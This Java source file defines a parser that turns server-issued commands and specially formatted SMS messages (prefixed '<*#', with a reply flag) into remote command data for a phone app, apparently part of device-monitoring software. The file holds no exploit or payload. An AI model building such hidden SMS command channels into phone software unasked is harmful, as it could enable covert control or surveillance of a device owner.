package com.vvt.remotecommandmanager.utils;

import java.util.ArrayList;
import java.util.Collections;

import com.vvt.datadeliverymanager.Customization;
import com.vvt.logger.FxLog;
import com.vvt.phoenix.prot.command.response.PCC;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.SmsCommand;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.NotSmsCommandException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;

public class RemoteCommandParser {
	
	private static final String TAG = "RemoteCommandParser";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	
	public RemoteCommandParser() {
		
	}
	
	public static RemoteCommandData parse(PCC pcc) {
		
		String cmdCode = Integer.toString(pcc.getPccCode());
		String senderNumber = null;
		ArrayList<String> arguments = new ArrayList<String>();
		
		for (int i=0 ; i < pcc.getArgumentCount() ; i++) {
			arguments.add(pcc.getArgument(i));
		}
		
		RemoteCommandData commandData = new RemoteCommandData();
		commandData.setArguments(arguments);
		commandData.setCommandCode(cmdCode);
		commandData.setRmtCommandType(RemoteCommandType.PCC);
		commandData.setSenderNumber(senderNumber);
		commandData.setSmsReplyRequired(false);
		
		return commandData;
	}
	
	public static RemoteCommandData parse(SmsCommand smsCommand) throws RemoteCommandException{
		
		String senderNumber = smsCommand.getSenderNumber().trim();
		String msg = smsCommand.getMessage().trim();
		
		if(!msg.startsWith("<*#")) {
			throw new NotSmsCommandException();
		}
		
		if(!isValidFormat(msg)) {
			throw new InvalidCommandFormatException();
		}
		
		String cmdCode = getSmsCommandCode(msg);
		ArrayList<String> tempArgs = getSmsCommandArgs(msg);
		boolean isReplyRequired = tempArgs.get(tempArgs.size()-1).equalsIgnoreCase("D");
		
		//Clear Tag <D>
		ArrayList<String> args = new ArrayList<String>();
		if(isReplyRequired) {
			String[] chunks = tempArgs.toArray(new String [tempArgs.size()]);
			String[] result = new String[tempArgs.size() - 1];
			System.arraycopy(chunks, 0, result, 0, tempArgs.size() - 1);
			Collections.addAll(args, result); 
		} else {
			args.addAll(tempArgs);
		}

		RemoteCommandData commandData = new RemoteCommandData();
		commandData.setArguments(args);
		commandData.setCommandCode(cmdCode);
		commandData.setRmtCommandType(RemoteCommandType.SMS_COMMAND);
		commandData.setSenderNumber(senderNumber);
		commandData.setSmsReplyRequired(isReplyRequired);
		
		return commandData;
	}
	
	public static String getMsgSystemEvent(PCC pcc) {
		StringBuilder msg = new StringBuilder();
		msg.append("<");
		msg.append(pcc.getPccCode());
		msg.append(">");
		msg.append("<");
		msg.append(pcc.getArgumentCount());
		msg.append(">");
		for(int i = 0 ; i < pcc.getArgumentCount() ; i++) {
			msg.append("<");
			msg.append(pcc.getArgument(i));
			msg.append(">");
		}
		
		return msg.toString();
	}
	
	private static String getSmsCommandCode(String msg) {
		String[] chunks = parseMsgToArray(msg);
		
		String cmdCode = "-1";
		
		if(chunks != null) {
			// clear '*#' at head
			cmdCode = chunks[0].substring(2); 
		}
		
		return cmdCode;
		
	}
	
	private static ArrayList<String> getSmsCommandArgs(String msg) {
		
		ArrayList<String> args =  new ArrayList<String>();
		String[] chunks = parseMsgToArray(msg);
		
		if(chunks != null) {
			int length = chunks.length;

			//select only arguments.
			String[] result = new String[length - 1];
			System.arraycopy(chunks, 1, result, 0, length - 1);
			Collections.addAll(args, result); 
			
		}
		
		return args;
	}
	
	private static String[] parseMsgToArray(String msg) {
		
		String[] chunks = null;
		
		if(msg != null && !msg.equals("")) {
			
			chunks = msg.split("><");
			int length = chunks.length;
			
			if(LOGV) FxLog.v(TAG, "Chunk length: " + length);
			
			// valid argument length
			// clear '<' at head
			chunks[0] = chunks[0].substring(1, chunks[0].length()); 
			// clear '>' at tail
			chunks[length - 1] = chunks[length - 1].substring(0, (chunks[length - 1].length() - 1)); 
			
			//clear space
			for(int i=0 ; i < length ; i++) {
				chunks[i] = chunks[i].trim();
			}
			
		}
			
		return chunks;

	}
	
	private static boolean isValidFormat(String msg) {
		
		boolean isValid = true;
		
		if(msg != null && !msg.equals("")) {
			String[] chunks = msg.split("><");
			int length = chunks.length;
			
			if(chunks[0].startsWith("<*#") && chunks[length - 1].charAt(chunks[length - 1].length()-1) == '>') {
				
				// valid argument length
				// clear '<*#' at head
				chunks[0] = chunks[0].substring(3, chunks[0].length()); 
				// clear '>' at tail
				chunks[length - 1] = chunks[length - 1].substring(0, (chunks[length - 1].length() - 1));
				
				//In each chunk should not contain '<' or '>'.
				for(String s : chunks) {
					if(s.contains("<") || s.contains(">")) {
						isValid = false;
						break;
					}
				}
			} else {
				isValid = false;
			}
		}
		
		return isValid;
	}
}
